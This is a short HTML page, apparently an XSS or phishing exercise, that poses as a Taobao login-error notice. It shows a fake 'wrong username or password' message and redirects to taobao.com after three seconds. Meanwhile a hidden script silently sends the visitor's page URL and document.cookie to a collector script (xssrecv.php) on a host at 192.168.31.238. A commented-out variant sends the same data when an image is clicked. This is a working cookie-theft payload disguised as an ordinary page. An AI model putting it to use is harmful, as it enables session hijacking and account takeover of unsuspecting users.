<!--淘宝用户密码错误跳转-->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script>
    document.write('你的用户名密码不正确，请重新登录');
    setTimeout(function(){
        location.href='https://www.taobao.com';},
        3000);
    </script>
</head>
<body>        
    <!--单机图片获取cookie-->
    <!-- <a href='javascript: location.href="http://192.168.31.238:8080/xssrecv.php?url="+location.href+"&cookie="+document.cookie'>
        <img src="https://img.soogif.com/vqanKoksQXmBBKruLB1EHTFZViCMZvwg.gif_s400x0">
    <a> -->
        
    <!--无显示效过获取cookie-->
    <script>
        new Image().src = "http://192.168.31.238:8080/xssrecv.php?url=" + location.href + "&cookie=" + document.cookie;
    </script>
</body>
</html>